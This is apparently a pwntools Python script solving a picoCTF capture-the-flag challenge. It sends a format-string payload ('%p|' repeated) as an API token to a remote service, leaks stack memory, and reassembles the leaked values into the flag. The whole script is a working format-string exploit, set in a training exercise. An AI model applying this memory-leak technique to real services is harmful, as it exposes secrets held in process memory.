from pwn import *

IP = "mercury.picoctf.net"
port = 53437

context.log_level = "CRITICAL"


base_offset = 0x55a9b18ab000 - 0x55a9b320a2a0 #addr from offset 7

def leak_addreses(i):
    elf = ELF("./binary")
    # p = elf.process()
    p = remote(IP, port)
    
    fmt_input = b"%p|"*i
    payload = [
        fmt_input
    ]

    payload = b"".join(payload)

    p.recvuntil("1) Buy some stonks!\n")
    p.recvuntil("2) View my portfolio\n")

    p.sendline("1")

    p.recvuntil("What is your API token?\n")

    p.sendline(payload)
    p.recvuntil("Buying stonks with token:\n")
    addr = p.recvuntil("\n").rstrip()
    print(i, addr)
    p.recv()
    # p.interactive()
    return addr.decode().split('|')


# for i in range(300):
addresses = leak_addreses(300)
buf = []
for addr in addresses: 
    if addr != "(nil)" and len(addr) > 5:
        buf.append(addr[2:])

# for b in buf:
#     print(b)


bytes_arr = ""
for line in buf:
    if len(line) == 7:
        line = "0" + line
    bytes_arr = line + bytes_arr
print(bytes_arr)


enc_flag = bytearray.fromhex(bytes_arr)
print(enc_flag[::-1])
# print(enc_flag.decode())


